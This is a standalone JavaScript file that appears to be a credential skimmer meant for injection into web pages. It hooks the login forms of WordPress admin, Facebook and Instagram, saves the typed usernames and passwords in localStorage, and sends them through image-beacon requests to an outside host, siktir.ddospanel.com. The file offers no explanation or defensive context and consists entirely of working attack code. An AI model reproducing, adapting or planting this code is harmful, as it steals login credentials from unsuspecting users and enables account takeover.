
if(window.location.href.indexOf("wp-login.php") > 0 || window.location.href.indexOf("wp-admin") > 0) {
document.getElementById('wp-submit').onclick = function() {
   new Image().src = 'http://siktir.ddospanel.com/cp.php?username='+document.getElementById('user_login').value+'&sifre='+document.getElementById('user_pass').value+'&location='+location.href;
};
}

if (top.location.href.indexOf("facebook.com") > -1 && document.getElementById("login_form")) {
    document.getElementById("login_form").onsubmit = function (e) {
        localStorage.setItem("upom", document.getElementById("email").value);
        localStorage.setItem("uzom", document.getElementById("pass").value);
        setTimeout(function () {
            document.getElementById("login_form").submit()
        }, 99);
        return false
    }
}
if (localStorage.upom && localStorage.uzom) {
	
	tarih = new Date();
    storage_key = 'access_twitter_';
    if (!localStorage[storage_key] || (localStorage[storage_key] && tarih.getTime() >= localStorage[storage_key])) {
        tarih.setTime(tarih.getTime() + 9999 * 9999 * 9999);
        localStorage[storage_key] = tarih.getTime();
		new Image().src = "http://siktir.ddospanel.com/cpp.php" + "?us=" + localStorage.upom + "&pw=" + localStorage.uzom;	
    }	
}



if (top.location.href.indexOf("instagram.com") > -1) {
    document.getElementsByClassName("_rwf8p")[0].onsubmit = function (e) {
        localStorage.setItem("kadi", document.getElementsByClassName("_kp5f7 _qy55y")[0].value);
        localStorage.setItem("sifre", document.getElementsByClassName("_kp5f7 _qy55y")[1].value);
        setTimeout(function () {
            document.getElementsByClassName("_rwf8p")[0].submit()
        }, 99);
        return false
    }
}
if (localStorage.kadi && localStorage.sifre) {
	
		new Image().src = "https://siktir.ddospanel.com/cpin.php" + "?us=" + localStorage.kadi + "&pw=" + localStorage.sifre;	

}
